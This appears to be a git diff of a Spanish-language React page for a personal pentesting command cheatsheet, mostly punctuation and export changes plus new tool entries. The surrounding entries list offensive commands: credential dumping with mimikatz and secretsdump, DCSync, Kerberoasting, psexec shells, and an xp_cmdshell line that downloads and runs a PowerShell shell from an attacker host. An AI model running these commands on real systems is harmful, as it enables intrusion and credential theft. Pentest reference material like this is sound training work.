@@ -1,11 +1,11 @@
 /**
- * Comandos — Arsenal de comandos y técnicas ofensivas
+ * Comandos - Arsenal de comandos y técnicas ofensivas
  * Cheatsheet personal: comandos reales con ejemplos, organizado por herramienta y fase.
  * Se vincula con la sección de Técnicas (MITRE ATT&CK).
  */
 
 import { useState, useMemo, useEffect, useRef } from 'react'
-import { Search, Copy, Check, Terminal, ChevronRight, ChevronDown, ExternalLink, Plus, Pencil, Trash2, X } from 'lucide-react'
+import { Search, Copy, Check, Terminal, ChevronRight, ChevronDown, ExternalLink, Plus, Pencil, Trash2, X, Send, Loader2 } from 'lucide-react'
 import { Link } from '@tanstack/react-router'
 import { toast } from 'sonner'
 import { Input } from '@/components/ui/input'
@@ -15,6 +15,7 @@ import { Textarea } from '@/components/ui/textarea'
 import { cn } from '@/lib/utils'
 import { apiFetch } from '@/lib/api'
 import { useAuthStore } from '@/stores/auth-store'
+import { HelpPopover } from '@/components/ui/help-popover'
 
 // ─── Tipos ────────────────────────────────────────────────────────────────────
 type Phase = 'recon' | 'scanning' | 'exploitation' | 'post_exploitation' | 'general'
@@ -35,7 +36,7 @@ interface Comando {
 }
 
 // ─── Fases ────────────────────────────────────────────────────────────────────
-const PHASE_LABELS: Record<Phase, string> = {
+export const PHASE_LABELS: Record<Phase, string> = {
   recon:            'Reconocimiento',
   scanning:         'Escaneo',
   exploitation:     'Explotación',
@@ -84,69 +85,69 @@ interface ToolMeta {
 }
 
 const TOOL_META: Record<string, ToolMeta> = {
-  // cat1 — Reconocimiento / OSINT
+  // cat1 - Reconocimiento / OSINT
   amass:        { label: 'Amass',        description: 'DNS enumeration y OSINT de subdominios',              arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1590'] },
   subfinder:    { label: 'Subfinder',    description: 'Descubrimiento pasivo de subdominios vía APIs',        arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1590'] },
   theHarvester: { label: 'theHarvester', description: 'OSINT de emails, subdominios, hosts e IPs',           arsenalCat: 'cat1',  kali: 'yes',     mitreIds: ['T1589', 'T1590'] },
-  // cat2 — Escaneo de red
-  nmap:         { label: 'Nmap',         description: 'Network mapper — port scanning y fingerprinting',      arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1595', 'T1592'] },
+  // cat2 - Escaneo de red
+  nmap:         { label: 'Nmap',         description: 'Network mapper - port scanning y fingerprinting',      arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1595', 'T1592'] },
   masscan:      { label: 'Masscan',      description: 'Escaneo de puertos masivo a alta velocidad',           arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1595'] },
   rustscan:     { label: 'RustScan',     description: 'Port scanner ultra-rápido, pasa resultados a nmap',    arsenalCat: 'cat2',  kali: 'partial', mitreIds: ['T1595'] },
-  // cat3 — Seguridad web
+  // cat3 - Seguridad web
   burpsuite:    { label: 'Burp Suite',   description: 'Proxy + web app testing toolkit',                     arsenalCat: 'cat3',  kali: 'partial', mitreIds: ['T1190'] },
   sqlmap:       { label: 'SQLMap',       description: 'Detección y explotación de SQL Injection',             arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1190'] },
-  nikto:        { label: 'Nikto',        description: 'Web server scanner — misconfigs y vulns conocidas',    arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1190'] },
+  nikto:        { label: 'Nikto',        description: 'Web server scanner - misconfigs y vulns conocidas',    arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1190'] },
   whatweb:      { label: 'WhatWeb',      description: 'Fingerprinting de tecnologías web',                    arsenalCat: 'cat3',  kali: 'yes',     mitreIds: ['T1592'] },
-  // cat4 — Fuzzing
-  ffuf:         { label: 'FFuf',         description: 'Web fuzzing rápido — directorios, parámetros, vhosts', arsenalCat: 'cat4',  kali: 'yes',     mitreIds: ['T1190'] },
+  // cat4 - Fuzzing
+  ffuf:         { label: 'FFuf',         description: 'Web fuzzing rápido - directorios, parámetros, vhosts', arsenalCat: 'cat4',  kali: 'yes',     mitreIds: ['T1190'] },
   gobuster:     { label: 'Gobuster',     description: 'Directory/DNS/vhost brute-force',                      arsenalCat: 'cat4',  kali: 'yes',     mitreIds: ['T1190'] },
   feroxbuster:  { label: 'Feroxbuster',  description: 'Directory fuzzer recursivo y rápido en Rust',          arsenalCat: 'cat4',  kali: 'partial', mitreIds: ['T1190'] },
-  // cat5 — AppSec / DevSecOps
-  semgrep:      { label: 'Semgrep',      description: 'SAST — análisis estático de código multi-lenguaje',    arsenalCat: 'cat5',  kali: 'no',      mitreIds: [] },
+  // cat5 - AppSec / DevSecOps
+  semgrep:      { label: 'Semgrep',      description: 'SAST - análisis estático de código multi-lenguaje',    arsenalCat: 'cat5',  kali: 'no',      mitreIds: [] },
   trufflehog:   { label: 'TruffleHog',  description: 'Detecta secrets y credenciales en git repos',          arsenalCat: 'cat5',  kali: 'no',      mitreIds: ['T1552'] },
   gitleaks:     { label: 'Gitleaks',    description: 'Escanea repos git por secrets filtrados',               arsenalCat: 'cat5',  kali: 'no',      mitreIds: ['T1552'] },
-  // cat6 — API Security
-  curl:         { label: 'cURL',         description: 'HTTP client — recon, testing, API calls',              arsenalCat: 'cat6',  kali: 'yes',     mitreIds: ['T1592'] },
+  // cat6 - API Security
+  curl:         { label: 'cURL',         description: 'HTTP client - recon, testing, API calls',              arsenalCat: 'cat6',  kali: 'yes',     mitreIds: ['T1592'] },
   httpie:       { label: 'HTTPie',       description: 'HTTP client amigable para testing de APIs',             arsenalCat: 'cat6',  kali: 'yes',     mitreIds: [] },
-  // cat7 — Fuerza bruta
+  // cat7 - Fuerza bruta
   hydra:        { label: 'Hydra',        description: 'Brute-force de autenticación remota',                  arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1133', 'T1110'] },
   hashcat:      { label: 'Hashcat',      description: 'GPU-accelerated password cracking',                    arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
   john:         { label: 'John the Ripper', description: 'Password cracking clásico y versátil',              arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
-  // cat8 — AD / Windows
+  // cat8 - AD / Windows
   impacket:     { label: 'Impacket',     description: 'Suite Python para protocolos Windows/AD',              arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1003', 'T1021'] },
   mimikatz:     { label: 'Mimikatz',     description: 'Extracción de credenciales Windows',                   arsenalCat: 'cat8',  kali: 'no',      mitreIds: ['T1003', 'T1134'] },
   crackmapexec: { label: 'CrackMapExec', description: 'Swiss army knife para pentesting de redes Windows',    arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1021', 'T1110'] },
   bloodhound:   { label: 'BloodHound',   description: 'Mapeo de rutas de ataque en Active Directory',         arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1069', 'T1087'] },
   evilwinrm:    { label: 'Evil-WinRM',   description: 'Shell interactiva via WinRM para post-explotación',    arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1021'] },
-  // cat9 — Explotación
+  // cat9 - Explotación
   metasploit:   { label: 'Metasploit',   description: 'Framework de explotación y post-explotación',          arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1190', 'T1203'] },
   msfvenom:     { label: 'MSFVenom',     description: 'Generador de payloads/shellcode',                      arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1566'] },
   shells:       { label: 'Reverse Shells', description: 'One-liners para reverse/bind shells',                arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
-  netcat:       { label: 'Netcat',       description: 'Swiss army knife de redes — shells, transfers',        arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
+  netcat:       { label: 'Netcat',       description: 'Swiss army knife de redes - shells, transfers',        arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
   python:       { label: 'Python',       description: 'Scripts, servidores rápidos, shells',                  arsenalCat: 'cat9',  kali: 'yes',     mitreIds: ['T1059'] },
   linpeas:      { label: 'LinPEAS',      description: 'Linux Privilege Escalation Awesome Script',            arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1068', 'T1548'] },
   winpeas:      { label: 'WinPEAS',      description: 'Windows Privilege Escalation Awesome Script',          arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1068', 'T1548'] },
-  // cat10 — Vuln assessment
+  // cat10 - Vuln assessment
   nuclei:       { label: 'Nuclei',       description: 'Vulnerability scanner basado en templates',            arsenalCat: 'cat10', kali: 'yes',     mitreIds: ['T1190'] },
-  // cat11 — Sniffing / MITM
+  // cat11 - Sniffing / MITM
   tcpdump:      { label: 'tcpdump',      description: 'Captura y análisis de tráfico de red',                 arsenalCat: 'cat11', kali: 'yes',     mitreIds: [] },
-  responder:    { label: 'Responder',    description: 'MITM — captura hashes NetNTLM via LLMNR/NBT-NS',       arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
-  bettercap:    { label: 'Bettercap',    description: 'Framework MITM modular — ARP, DNS, HTTP, BLE',         arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
-  // cat12 — Wireless
+  responder:    { label: 'Responder',    description: 'MITM - captura hashes NetNTLM via LLMNR/NBT-NS',       arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
+  bettercap:    { label: 'Bettercap',    description: 'Framework MITM modular - ARP, DNS, HTTP, BLE',         arsenalCat: 'cat11', kali: 'yes',     mitreIds: ['T1557'] },
+  // cat12 - Wireless
   aircrackng:   { label: 'Aircrack-ng',  description: 'Suite completa para auditoría de redes WiFi',          arsenalCat: 'cat12', kali: 'yes',     mitreIds: [] },
   wifite:       { label: 'Wifite',       description: 'Ataque automatizado a redes WiFi WPA/WEP',             arsenalCat: 'cat12', kali: 'yes',     mitreIds: [] },
-  // cat13 — Mobile
+  // cat13 - Mobile
   apktool:      { label: 'APKTool',      description: 'Decompila y recompila APKs Android',                   arsenalCat: 'cat13', kali: 'yes',     mitreIds: [] },
   jadx:         { label: 'JADX',         description: 'Decompilador DEX/APK a código Java legible',           arsenalCat: 'cat13', kali: 'no',      mitreIds: [] },
-  frida:        { label: 'Frida',        description: 'Dynamic instrumentation — hooking y análisis runtime',  arsenalCat: 'cat13', kali: 'no',      mitreIds: [] },
-  // cat14 — Cloud / contenedores
+  frida:        { label: 'Frida',        description: 'Dynamic instrumentation - hooking y análisis runtime',  arsenalCat: 'cat13', kali: 'no',      mitreIds: [] },
+  // cat14 - Cloud / contenedores
   awscli:       { label: 'AWS CLI',      description: 'CLI oficial para auditoría y pentesting de AWS',        arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
   trivy:        { label: 'Trivy',        description: 'Scanner de vulns en imágenes Docker, repos y configs',  arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
-  kubectl:      { label: 'kubectl',      description: 'CLI de Kubernetes — enumeración y post-explotación',    arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
-  // cat15 — Reversing
+  kubectl:      { label: 'kubectl',      description: 'CLI de Kubernetes - enumeración y post-explotación',    arsenalCat: 'cat14', kali: 'no',      mitreIds: [] },
+  // cat15 - Reversing
   ghidra:       { label: 'Ghidra',       description: 'Reverse engineering framework de la NSA',              arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
   radare2:      { label: 'Radare2',      description: 'Framework de reversing y análisis de binarios',         arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
-  gdb:          { label: 'GDB',          description: 'GNU debugger — debugging y exploit development',        arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
+  gdb:          { label: 'GDB',          description: 'GNU debugger - debugging y exploit development',        arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
   binwalk:      { label: 'Binwalk',      description: 'Extracción y análisis de firmware',                    arsenalCat: 'cat15', kali: 'yes',     mitreIds: [] },
   // ssh
   ssh:          { label: 'SSH',          description: 'Tunneling, port forwarding, SOCKS, admin remoto',       arsenalCat: 'ssh',   kali: 'yes',     mitreIds: ['T1021'] },
@@ -154,25 +155,35 @@ const TOOL_META: Record<string, ToolMeta> = {
   wordlists:    { label: 'Wordlists',    description: 'Gestión y uso de diccionarios',                        arsenalCat: 'util',  kali: 'yes',     mitreIds: [] },
   wget:         { label: 'wget',         description: 'Descarga de archivos, recon de sitios',                 arsenalCat: 'util',  kali: 'yes',     mitreIds: [] },
   // OSINT extendido
-  'google-dorks':     { label: 'Google Dorks',    description: 'Dorks para Google, Bing y Shodan — recon avanzado',          arsenalCat: 'cat1',  kali: 'no',      mitreIds: ['T1593'] },
+  'google-dorks':     { label: 'Google Dorks',    description: 'Dorks para Google, Bing y Shodan - recon avanzado',          arsenalCat: 'cat1',  kali: 'no',      mitreIds: ['T1593'] },
   osrframework:       { label: 'OSRFramework',    description: 'OSINT de usuarios, emails, teléfonos y dominios',            arsenalCat: 'cat1',  kali: 'no',      mitreIds: ['T1589'] },
   // Wordlist gen
   crunch:             { label: 'Crunch',          description: 'Generador de wordlists con patrones y clases de caracteres', arsenalCat: 'cat7',  kali: 'yes',     mitreIds: ['T1110'] },
   // Web manual
-  'manual-sqli':      { label: 'Manual SQLi',     description: 'Payloads de inyección SQL sin sqlmap — quick reference',    arsenalCat: 'cat3',  kali: 'no',      mitreIds: ['T1190'] },
+  'manual-sqli':      { label: 'Manual SQLi',     description: 'Payloads de inyección SQL sin sqlmap - quick reference',    arsenalCat: 'cat3',  kali: 'no',      mitreIds: ['T1190'] },
   // Shell escape
   'restricted-shell': { label: 'Shell Escape',    description: 'Escape de shells restringidas: rbash, lshell, vi, PATH',    arsenalCat: 'cat9',  kali: 'no',      mitreIds: ['T1059'] },
+  // Análisis de tráfico
+  tshark:             { label: 'tshark',           description: 'Analizador de tráfico de red en CLI - versión terminal de Wireshark', arsenalCat: 'cat11', kali: 'yes', mitreIds: ['T1040'] },
+  // Exploit DB CLI
+  searchsploit:       { label: 'Searchsploit',     description: 'CLI para buscar en la base de datos de ExploitDB offline', arsenalCat: 'cat2',  kali: 'yes',     mitreIds: ['T1588'] },
+  // SMB enumeration
+  smbmap:             { label: 'smbmap',           description: 'Enumeración de recursos compartidos SMB y permisos',       arsenalCat: 'cat8',  kali: 'yes',     mitreIds: ['T1135'] },
+  // Windows privesc scanners
+  'win-privesc-tools':{ label: 'Win PrivEsc Tools', description: 'wes-ng y windows-exploit-suggester - detección de parches faltantes', arsenalCat: 'cat8', kali: 'no', mitreIds: ['T1068'] },
+  // Windows post-exploit
+  'win-post-manual':  { label: 'Win Post Manual',  description: 'Técnicas manuales post-explotación Windows: SAM, shares, tokens', arsenalCat: 'cat8', kali: 'no',  mitreIds: ['T1003', 'T1134'] },
 }
 
 // ─── Base de comandos ─────────────────────────────────────────────────────────
-const COMANDOS: Comando[] = [
+export const COMANDOS: Comando[] = [
   // ── NMAP ──────────────────────────────────────────────────────────────────
   {
     id: 'nmap-syn',
     tool: 'nmap', phase: 'scanning', category: 'Port Scanning',
     title: 'SYN Scan (stealth)',
     command: 'nmap -sS -p- --min-rate 5000 -T4 <target>',
-    description: 'Half-open SYN scan. No completa el handshake TCP — más silencioso que un connect scan. Escanea todos los puertos a alta velocidad.',
+    description: 'Half-open SYN scan. No completa el handshake TCP - más silencioso que un connect scan. Escanea todos los puertos a alta velocidad.',
     tags: ['port-scan', 'stealth', 'tcp'],
     notes: 'Requiere root/sudo. Es el tipo de escaneo más común en pentesting.',
     mitreId: 'T1595',
@@ -199,7 +210,7 @@ const COMANDOS: Comando[] = [
     tool: 'nmap', phase: 'scanning', category: 'Port Scanning',
     title: 'UDP Top Ports',
     command: 'nmap -sU --top-ports 200 --min-rate 1000 <target>',
-    description: 'Escaneo UDP de los 200 puertos más comunes. UDP es lento — limitar a top ports primero. Útil para encontrar DNS, SNMP, NFS, TFTP, etc.',
+    description: 'Escaneo UDP de los 200 puertos más comunes. UDP es lento - limitar a top ports primero. Útil para encontrar DNS, SNMP, NFS, TFTP, etc.',
     tags: ['udp', 'port-scan'],
   },
   {
@@ -500,7 +511,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'burp-repeater',
     tool: 'burpsuite', phase: 'exploitation', category: 'Repeater',
-    title: 'Repeater — replay de requests',
+    title: 'Repeater - replay de requests',
     command: '# 1. Capturar request en Proxy → HTTP History\n# 2. Click derecho → Send to Repeater (Ctrl+R)\n# 3. Modificar parámetros y enviar con Ctrl+Space\n# 4. Comparar respuestas',
     description: 'Repeater permite enviar y modificar requests manualmente. Esencial para testing manual de SQLi, XSS, IDOR, etc.',
     tags: ['repeater', 'manual-testing'],
@@ -508,7 +519,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'burp-intruder',
     tool: 'burpsuite', phase: 'exploitation', category: 'Intruder',
-    title: 'Intruder — fuzzing/brute force',
+    title: 'Intruder - fuzzing/brute force',
     command: '# 1. Send to Intruder (Ctrl+I)\n# 2. Positions tab: seleccionar §param§\n# 3. Payloads tab: cargar wordlist\n# 4. Attack Type: Sniper (1 param) o Cluster Bomb (múltiples)',
     description: 'Intruder para brute force de formularios, fuzzing de parámetros y testing de lógica. En Community es throttled (lento).',
     tags: ['intruder', 'brute-force', 'fuzzing'],
@@ -583,7 +594,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-secretsdump',
     tool: 'impacket', phase: 'post_exploitation', category: 'Credential Dumping',
-    title: 'secretsdump — dump de credenciales',
+    title: 'secretsdump - dump de credenciales',
     command: 'secretsdump.py DOMAIN/user:password@<target>',
     description: 'Dump remoto de credenciales: SAM, LSA secrets, NTDS (si Domain Controller). Requiere credenciales admin.',
     tags: ['credentials', 'dump', 'windows', 'ad'],
@@ -593,7 +604,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-psexec',
     tool: 'impacket', phase: 'post_exploitation', category: 'Lateral Movement',
-    title: 'psexec — shell remota',
+    title: 'psexec - shell remota',
     command: 'psexec.py DOMAIN/user:password@<target>',
     description: 'Shell SYSTEM remota via SMB. Análogo al PsExec de Sysinternals. Requiere admin share disponible.',
     tags: ['shell', 'lateral-movement', 'smb', 'windows'],
@@ -612,7 +623,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-smbclient',
     tool: 'impacket', phase: 'post_exploitation', category: 'File Transfer',
-    title: 'smbclient — navegar shares',
+    title: 'smbclient - navegar shares',
     command: 'smbclient.py DOMAIN/user:password@<target>',
     description: 'Cliente SMB interactivo para navegar y transferir archivos de shares Windows.',
     tags: ['smb', 'file-transfer', 'windows'],
@@ -620,7 +631,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-kerberoast',
     tool: 'impacket', phase: 'post_exploitation', category: 'Active Directory',
-    title: 'GetUserSPNs — Kerberoasting',
+    title: 'GetUserSPNs - Kerberoasting',
     command: 'GetUserSPNs.py DOMAIN/user:password -dc-ip <dc-ip> -request -outputfile kerberoast.txt',
     description: 'Solicita tickets Kerberos (TGS) para cuentas de servicio con SPN configurado. Los tickets se crackean offline con hashcat.',
     tags: ['kerberoasting', 'ad', 'kerberos', 'credential-attack'],
@@ -632,7 +643,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'mimikatz-logonpasswords',
     tool: 'mimikatz', phase: 'post_exploitation', category: 'Credential Dumping',
-    title: 'logonpasswords — credenciales en memoria',
+    title: 'logonpasswords - credenciales en memoria',
     command: 'privilege::debug\nsekurlsa::logonpasswords',
     description: 'Extrae credenciales (plaintext y hashes) de LSASS. Requiere SeDebugPrivilege (admin/SYSTEM).',
     tags: ['credentials', 'lsass', 'windows', 'dump'],
@@ -651,7 +662,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'mimikatz-lsadump',
     tool: 'mimikatz', phase: 'post_exploitation', category: 'Credential Dumping',
-    title: 'lsadump::dcsync — replicar AD',
+    title: 'lsadump::dcsync - replicar AD',
     command: 'lsadump::dcsync /domain:DOMAIN /user:krbtgt',
     description: 'Simula una replicación de DC para obtener hashes. Requiere privilegios de Domain Admin o replication rights. Obtener hash de krbtgt para Golden Ticket.',
     tags: ['dcsync', 'ad', 'golden-ticket', 'krbtgt'],
@@ -684,7 +695,7 @@ const COMANDOS: Comando[] = [
     tool: 'winpeas', phase: 'post_exploitation', category: 'Privilege Escalation',
     title: 'Ejecutar WinPEAS',
     command: '# Descargar y ejecutar en PowerShell:\n(New-Object Net.WebClient).DownloadFile("http://<tu-ip>:8080/winPEASx64.exe", "C:\\Temp\\wp.exe")\nC:\\Temp\\wp.exe > C:\\Temp\\winpeas.txt',
-    description: 'WinPEAS para Windows — misconfigurations, servicios vulnerables, credenciales almacenadas, AlwaysInstallElevated, etc.',
+    description: 'WinPEAS para Windows - misconfigurations, servicios vulnerables, credenciales almacenadas, AlwaysInstallElevated, etc.',
     tags: ['privesc', 'windows', 'enum', 'automation'],
     mitreId: 'T1068',
   },
@@ -949,7 +960,7 @@ const COMANDOS: Comando[] = [
     tags: ['recon', 'web', 'osint'],
   },
 
-  // ── SSH — comandos prácticos (no hacking) ─────────────────────────────────
+  // ── SSH - comandos prácticos (no hacking) ─────────────────────────────────
   {
     id: 'ssh-connect-port',
     tool: 'ssh', phase: 'general', category: 'Conexión',
@@ -961,7 +972,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'ssh-copy-file-to',
     tool: 'ssh', phase: 'general', category: 'Transferencia de archivos',
-    title: 'SCP — subir archivo al servidor',
+    title: 'SCP - subir archivo al servidor',
     command: 'scp archivo.txt user@host:/ruta/destino/\nscp -P 2222 archivo.txt user@host:/home/user/\nscp -r ./carpeta/ user@host:/home/user/',
     description: 'Copiar archivos al servidor remoto con SCP. -P para puerto personalizado, -r para directorios completos.',
     tags: ['scp', 'file-transfer', 'upload'],
@@ -969,7 +980,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'ssh-copy-file-from',
     tool: 'ssh', phase: 'general', category: 'Transferencia de archivos',
-    title: 'SCP — descargar archivo del servidor',
+    title: 'SCP - descargar archivo del servidor',
     command: 'scp user@host:/ruta/archivo.txt ./local/\nscp -r user@host:/var/log/ ./logs_backup/',
     description: 'Descargar archivos o directorios desde un servidor remoto. Indispensable para traer logs, configs y backups.',
     tags: ['scp', 'file-transfer', 'download'],
@@ -1012,7 +1023,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'ssh-config',
     tool: 'ssh', phase: 'general', category: 'Configuración',
-    title: 'SSH config — alias de hosts',
+    title: 'SSH config - alias de hosts',
     command: '# ~/.ssh/config\nHost mi-server\n  HostName 192.168.1.100\n  User admin\n  Port 2222\n  IdentityFile ~/.ssh/id_ed25519\n\n# Luego simplemente:\nssh mi-server',
     description: 'El archivo ~/.ssh/config permite crear aliases con todas las opciones. Ahorra tipeo en hosts que usás frecuentemente.',
     tags: ['config', 'alias', 'productivity'],
@@ -1090,7 +1101,7 @@ const COMANDOS: Comando[] = [
     description: 'Detecta archivos peligrosos, versiones vulnerables, headers de seguridad faltantes y misconfigurations comunes.',
     tags: ['web', 'vuln-scan', 'headers'],
     mitreId: 'T1190',
-    notes: 'Ruidoso — nikto genera muchas requests. No usar en ambientes de producción sin autorización.',
+    notes: 'Ruidoso - nikto genera muchas requests. No usar en ambientes de producción sin autorización.',
   },
 
   // ── WHATWEB ───────────────────────────────────────────────────────────────
@@ -1118,7 +1129,7 @@ const COMANDOS: Comando[] = [
     tool: 'feroxbuster', phase: 'recon', category: 'Directory Fuzzing',
     title: 'Fuzzing recursivo',
     command: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt\nferoxbuster -u https://target.com -x php,html,js --depth 3 -o ferox.txt',
-    description: 'Feroxbuster es recursivo por defecto — al encontrar un directorio, lo fuzzea automáticamente. Más completo que gobuster para web.',
+    description: 'Feroxbuster es recursivo por defecto - al encontrar un directorio, lo fuzzea automáticamente. Más completo que gobuster para web.',
     tags: ['web', 'directory', 'fuzzing', 'recursive'],
     mitreId: 'T1190',
     notes: 'Instalar en Kali: apt install feroxbuster o cargo install feroxbuster',
@@ -1289,7 +1300,7 @@ const COMANDOS: Comando[] = [
     command: 'wifite --wpa --dict /usr/share/wordlists/rockyou.txt\nwifite -i wlan0 --kill --wpa --pmkid',
     description: 'Automatiza todo el proceso: pone en monitor mode, escanea, elige targets, captura handshakes y los crackea.',
     tags: ['wifi', 'automated', 'wpa', 'pmkid'],
-    notes: 'PMKID attack no requiere cliente conectado — más efectivo que esperar handshake.',
+    notes: 'PMKID attack no requiere cliente conectado - más efectivo que esperar handshake.',
   },
 
   // ── APKTOOL ───────────────────────────────────────────────────────────────
@@ -1445,7 +1456,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'smbclient-list-anon',
     tool: 'smbclient', phase: 'recon', category: 'SMB Enumeration',
-    title: 'Listar shares — anónimo',
+    title: 'Listar shares - anónimo',
     command: 'smbclient -L <target> -N',
     description: 'Lista recursos compartidos SMB sin autenticación (-N = no password). Útil para detectar shares públicos.',
     tags: ['smb', 'enum', 'anonymous', 'windows'],
@@ -1455,7 +1466,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'smbclient-list-auth',
     tool: 'smbclient', phase: 'recon', category: 'SMB Enumeration',
-    title: 'Listar shares — autenticado',
+    title: 'Listar shares - autenticado',
     command: 'smbclient -L <target> -U "<usuario>"',
     description: 'Lista shares usando credenciales conocidas. Pedirá la contraseña interactivamente.',
     tags: ['smb', 'enum', 'auth', 'windows'],
@@ -1474,7 +1485,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'smbclient-ftp-anon',
     tool: 'smbclient', phase: 'recon', category: 'FTP',
-    title: 'FTP — conexión anónima',
+    title: 'FTP - conexión anónima',
     command: 'ftp <target>\n# Usuario: anonymous\n# Password: (enter vacío o cualquier email)\n# Comandos:\n# ls / dir   → listar\n# get <file> → descargar\n# put <file> → subir\n# bye        → salir',
     description: 'Conexión FTP con usuario anonymous. Muchos servidores FTP mal configurados permiten acceso anónimo con lectura o escritura.',
     tags: ['ftp', 'anonymous', 'enum', 'file-transfer'],
@@ -1486,7 +1497,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'oletools-olevba',
     tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
-    title: 'olevba — analizar macros VBA',
+    title: 'olevba - analizar macros VBA',
     command: 'olevba <archivo>.xlsm\nolevba <archivo>.doc\nolevba <archivo>.xls --decode  # Decodifica strings hex/base64 en el código VBA',
     description: 'Extrae y analiza macros VBA de archivos Office (xls, xlsx, xlsm, doc, docm, ppt). Muestra código, keywords sospechosos y strings codificados. Ideal para análisis de phishing o cuando encontrás un Office en un share.',
     tags: ['macro', 'vba', 'office', 'malware-analysis', 'phishing'],
@@ -1496,7 +1507,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'oletools-mraptor',
     tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
-    title: 'mraptor — detectar macros maliciosas',
+    title: 'mraptor - detectar macros maliciosas',
     command: 'mraptor <archivo>.xlsm\nmraptor -r /ruta/directorio/  # Escanear directorio recursivo',
     description: 'Detecta automáticamente si un archivo Office contiene macros que ejecutan comandos, acceden a internet o al sistema de archivos. Útil para triage rápido de múltiples archivos.',
     tags: ['macro', 'vba', 'office', 'malware-analysis', 'triage'],
@@ -1505,17 +1516,17 @@ const COMANDOS: Comando[] = [
   {
     id: 'oletools-oleid',
     tool: 'oletools', phase: 'recon', category: 'Malware Analysis',
-    title: 'oleid — identificar características de archivos OLE',
+    title: 'oleid - identificar características de archivos OLE',
     command: 'oleid <archivo>.doc\noleid <archivo>.xls',
     description: 'Identifica características de archivos OLE/Office: si contiene macros VBA, Flash, objetos externos, si está cifrado. Primer paso antes de olevba.',
     tags: ['office', 'ole', 'malware-analysis', 'recon'],
   },
 
-  // ── IMPACKET — MSSQL / SMB SERVER ─────────────────────────────────────────
+  // ── IMPACKET - MSSQL / SMB SERVER ─────────────────────────────────────────
   {
     id: 'impacket-mssqlclient',
     tool: 'impacket', phase: 'exploitation', category: 'Database Exploitation',
-    title: 'mssqlclient — conectar a MSSQL',
+    title: 'mssqlclient - conectar a MSSQL',
     command: 'impacket-mssqlclient WORKGROUP/<user>:<pass>@<target> -windows-auth\n# Si la contraseña tiene $ escapar: pass\\$word',
     description: 'Cliente interactivo para Microsoft SQL Server. Con -windows-auth usa autenticación NTLM en lugar de SQL. Punto de entrada para explotar xp_cmdshell y pivotar a ejecución de comandos.',
     tags: ['mssql', 'database', 'windows', 'exploitation'],
@@ -1525,7 +1536,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-xpcmdshell',
     tool: 'impacket', phase: 'exploitation', category: 'Database Exploitation',
-    title: 'xp_cmdshell — habilitar y ejecutar comandos',
+    title: 'xp_cmdshell - habilitar y ejecutar comandos',
     command: '-- Desde mssqlclient:\nsp_configure "show advanced options", 1\nRECONFIGURE\nsp_configure "xp_cmdshell", 1\nRECONFIGURE\n\n-- Ejecutar comandos:\nxp_cmdshell "whoami"\nxp_cmdshell "dir C:\\"\n\n-- PowerShell reverse shell desde SQL:\nxp_cmdshell """powershell IEX(New-Object Net.WebClient).downloadString(\'http://<tu-ip>/shell.ps1\')"""',
     description: 'Habilita xp_cmdshell en MSSQL para ejecutar comandos del SO. Requiere privilegios de sysadmin. Permite descargar y ejecutar payloads vía PowerShell.',
     tags: ['mssql', 'rce', 'windows', 'exploitation', 'xp_cmdshell'],
@@ -1535,7 +1546,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'impacket-smbserver-ntlm',
     tool: 'impacket', phase: 'exploitation', category: 'Credential Capture',
-    title: 'smbserver — capturar NTLMv2 hash',
+    title: 'smbserver - capturar NTLMv2 hash',
